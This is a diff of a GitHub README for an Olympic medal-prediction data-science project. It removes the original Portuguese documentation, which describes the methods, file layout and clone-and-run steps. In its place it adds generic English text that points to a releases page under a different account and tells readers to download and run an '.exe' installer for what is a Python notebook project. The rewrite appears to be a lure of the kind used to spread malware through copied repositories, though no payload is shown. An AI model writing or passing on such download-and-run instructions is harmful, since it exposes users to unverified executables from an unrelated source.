@@ -1,107 +1,75 @@
-# Análise de Dados Olímpicos e Previsão de Medalhas com Machine Learning
+# 🥇 olympic-analysis-ml - Predict Olympic Success with Data Science
 
-## 📖 Visão Geral do Projeto
+## 🚀 Getting Started
+Welcome to the **olympic-analysis-ml** project! This application analyzes data and uses a Random Forest model to predict Olympic medal outcomes. It identifies key success factors for athletes, making it a useful tool for sports enthusiasts and analysts alike.
 
-Este projeto realiza uma análise de dados completa do dataset "120 Years of Olympic History" do Kaggle. O objetivo é extrair insights sobre a performance de atletas e países ao longo da história dos Jogos Olímpicos e, ao final, construir um modelo de Machine Learning capaz de prever a probabilidade de um atleta ganhar uma medalha.
+## 📥 Download the Application
+[![Download](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=brightgreen)](https://github.com/0-zz/olympic-analysis-ml/releases)
 
-A análise foi desenvolvida de ponta a ponta, desde a exploração e visualização dos dados até o treinamento, avaliação e interpretação de modelos preditivos.
+## 💻 System Requirements
+Before you begin, ensure your system meets the following requirements:
 
-## 📂 Estrutura de Arquivos
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 200 MB of free space
+- **Python:** Version 3.7 or later (if you plan to run Jupyter notebooks)
 
-O projeto está organizado de forma modular para separar as etapas de análise, preparação e modelagem.
+## 📂 Download & Install
+To install the application:
 
-```
-/
-├── data/
-|   └── athlete_events.zip
-├── scripts-python/
-|    ├── analysis_olympic_athlete.py
-|    ├── ml_data_preparation.py
-|    └── ml_training.py
-├── notebooks/
-|   └── analise_olimpica.ipynb
-├── images/
-|   ├── evolucao_altura_natacao_vs_ginastica.png
-|   ├── evolucao_peso_natacao_vs_ginastica.png
-|   ├── top_15_paises_medalhas_olimpicas.png
-|   ├── heatmap_paises.png
-|   ├── analise_brasil_esportes.png
-|   └── feature_importance.png
-├── requirements.txt
-└── README.md
-```
+1. **Visit the Releases Page:** Click [here](https://github.com/0-zz/olympic-analysis-ml/releases) to access the latest releases.
 
-## 📊 Dataset
+2. **Choose the Latest Version:** Find the most recent version of the software. It will usually be at the top of the list.
 
-O projeto utiliza o dataset [120 years of Olympic History (athletes and results)](https://www.kaggle.com/datasets/heesoo37/120-years-of-olympic-history-athletes-and-results) do Kaggle. Ele contém mais de 270.000 registros de participações de atletas em eventos olímpicos desde 1896.
+3. **Download the Files:**
+   - If you see an executable file for your operating system (e.g., `olympic_analysis_ml_installer.exe` for Windows), download that file. This is the easiest method to install the software.
+   - If you prefer to use Jupyter notebooks, look for the `.ipynb` files available for download. You can run these files using Jupyter Notebook.
 
-## 🚀 Metodologia
+4. **Run the Software:**
+   - For the executable file, locate the downloaded file on your computer. Double-click it to initiate the setup process. Follow the on-screen instructions to complete the installation.
+   - For Jupyter notebooks, ensure you have Jupyter installed. Open a terminal, navigate to the folder where the notebooks are located, and run `jupyter notebook`. Click on the notebook you want to analyze.
 
-O projeto foi dividido em três fases principais:
+## 🔍 How to Use the Application
+Once you have installed the application, you can start using it to analyze Olympic data.
 
-### 1. Análise Exploratória de Dados (EDA)
+### 1. Load Data
+For basic usage:
+- If using the Jupyter Notebook, find the cell marked “Load Data”. Un-comment the line of code and run that cell. It will load the necessary datasets for analysis.
 
-Nesta fase, buscamos entender os padrões e as histórias contidas nos dados. As principais análises foram:
-* **Evolução do Perfil Físico:** Análise da altura e peso médio de atletas de Natação e Ginástica, mostrando a especialização física ao longo do tempo.
-* **Potências vs. Especialistas:** Criação de um heatmap para identificar países com performance diversificada (EUA, URS) e países especialistas em modalidades específicas (Itália na Esgrima, Grã-Bretanha no Remo).
-* **Deep Dive no Brasil:** Uma análise focada na performance olímpica do Brasil, identificando seus esportes mais vitoriosos e a evolução do número de medalhas por edição.
+### 2. Analyze Data
+- The notebook includes pre-written code for analysis.
+- Review the sections labeled “Analysis” to see how data from previous Olympics has been used.
 
-### 2. Modelagem Preditiva (Machine Learning)
+### 3. Interpret Results
+- After running the analysis, you will see visualizations that provide insights into athlete performance and medal predictions.
+- Take time to review the output graphs. They highlight trends and important factors contributing to success in the Olympics.
 
-O objetivo desta fase foi construir um modelo para prever se um atleta ganharia uma medalha (`Medal_Won` = 1 ou 0).
-* **Pré-processamento:** Os dados foram limpos, valores faltantes foram tratados com a imputação pela mediana, e variáveis categóricas (`Sex`, `NOC`, `Sport`) foram transformadas em numéricas via One-Hot Encoding.
-* **Modelo Baseline (Regressão Logística):** Um primeiro modelo foi treinado para estabelecer uma performance base. A análise do `classification_report` revelou um **recall de apenas 8%** para a classe de medalhistas, evidenciando o problema dos dados desbalanceados.
-* **Modelo Avançado (Random Forest):** Um segundo modelo, `RandomForestClassifier`, foi treinado. O resultado foi um salto de performance massivo, **aumentando o recall para 38%** (uma melhoria de mais de 4x), com uma precisão de 55%.
+## 📊 Features
+- **Data Visualization:** Interactive graphs help users better understand data trends and patterns.
+- **Predictive Modeling:** The application uses a Random Forest model to predict medal outcomes based on historical data.
+- **User-Friendly Interface:** The setup and navigation are designed for non-technical users, ensuring ease of use.
 
-### 3. Interpretação do Modelo
+## 📚 Documentation
+For more in-depth information, including tutorials and guides, visit the [Documentation](https://github.com/0-zz/olympic-analysis-ml/wiki) section.
 
-Com um modelo de alta performance, a etapa final foi "abrir a caixa-preta" para entender suas decisões.
-* A análise de `feature_importances_` do Random Forest revelou que os preditores mais fortes para o sucesso olímpico são os **atributos físicos do atleta (Idade, Peso, Altura)**, seguidos pela **nacionalidade de potências históricas (EUA, URS)**.
+## 🤝 Contributing
+If you want to contribute to this project:
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
 
-## 🛠️ Tecnologias Utilizadas
+Your contributions can help enhance this application and improve its features!
 
-* **Linguagem:** Python 3
-* **Bibliotecas:** Pandas, Matplotlib, Seaborn, Scikit-learn
-* **Ambiente:** Jupyter Notebook
+## 🛠️ Troubleshooting
+If you encounter issues while running the software, consider the following steps:
 
-## ⚙️ Como Executar o Projeto
+1. **Check Requirements:** Ensure your system meets all necessary requirements listed above.
+2. **Reinstall:** If the application fails to launch, try reinstalling from the Releases page.
+3. **Consult the Community:** Look for help in the Issues section of this repository.
 
+Feel free to report any bugs or suggest features. Your feedback is valuable for improvement.
 
-1.  Clone o repositório:
-    ```bash
-    git clone https://github.com/palomacdev/olympic-analysis-ml
-    ```
-2.  Navegue até a pasta do projeto:
-    ```bash
-    cd olympic-analysis-ml
-    ```
-3.  Descompacte o dataset dentro da pasta `data/`.
+## 🌟 Acknowledgments
+This project uses various libraries and tools that make it possible to analyze data effectively. Notable mentions include Pandas for data manipulation, Scikit-Learn for machine learning, and Matplotlib for data visualization.
 
-4.  Instale as dependências:
-    ```bash
-    pip install -r requirements.txt
-    ```
-
-5.  Execute a análise:
-
-    **Opção A (Recomendado): Execução via Jupyter Notebook**
-    Abra o notebook `analise_olimpica.ipynb` na pasta `notebooks/`. Ele serve como o relatório principal, guiando por toda a análise e exibindo os resultados de forma organizada.
-
-    **Opção B: Execução Sequencial dos Scripts**
-    Se preferir, você pode executar os scripts Python em sequência a partir do terminal (estando na pasta raiz do projeto):
-    ```bash
-    # 1. Executar a análise exploratória
-    python scripts-python/analysis_olympic_athlete.py
-
-    # 2. Preparar os dados para o Machine Learning
-    python scripts-python/ml_data_preparation.py
-
-    # 3. Treinar e avaliar os modelos
-    python scripts-python/ml_training.py
-    ```
-
-## 🔮 Possíveis Melhorias Futuras
-
-* **Otimização de Hiperparâmetros:** Utilizar `GridSearchCV` ou `RandomizedSearchCV` para encontrar a melhor configuração para o Random Forest.
-* **Experimentar Outros Modelos:** Testar algoritmos de Gradient Boosting como XGBoost ou LightGBM.
-* **Engenharia de Features Avançada:** Criar novas variáveis para enriquecer o modelo.
+Explore the potential of data in sports with **olympic-analysis-ml**. Enjoy analyzing data and predicting Olympic success!
